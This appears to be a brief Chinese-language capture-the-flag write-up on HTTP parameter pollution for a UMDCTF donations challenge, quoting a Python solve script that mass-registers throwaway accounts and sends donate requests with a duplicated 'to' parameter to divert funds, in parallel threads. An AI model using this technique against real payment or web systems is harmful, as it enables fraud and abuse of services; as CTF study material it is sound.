HTTP的参数污染

大概就是面对多参数的处理问题

具体介绍在这里https://book.hacktricks.xyz/pentesting-web/parameter-pollution

主要是对于多参数的处理方式不太对，一开始一直在想session怎么搞

不得不说别人的代码写的像诗

```python
import os
import requests
from concurrent.futures import ThreadPoolExecutor

url = 'https://donations2-api.challs.umdctf.io'

def make_donation(from_user, to_user):
    s = requests.Session()

    r = s.post(f'{url}/api/register', data=dict(username=from_user, password='password'))
    r = s.post(f'{url}/api/login', data=dict(username=from_user, password='password'))
    r = s.post(f'{url}/api/donate', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=f'to=lisanalgaib&to={to_user}&currency=1000')

executor = ThreadPoolExecutor(max_workers=16)
for _ in range(100):
    executor.submit(make_donation, 'cyny6667'+os.urandom(4).hex(), 'cyny666')
```

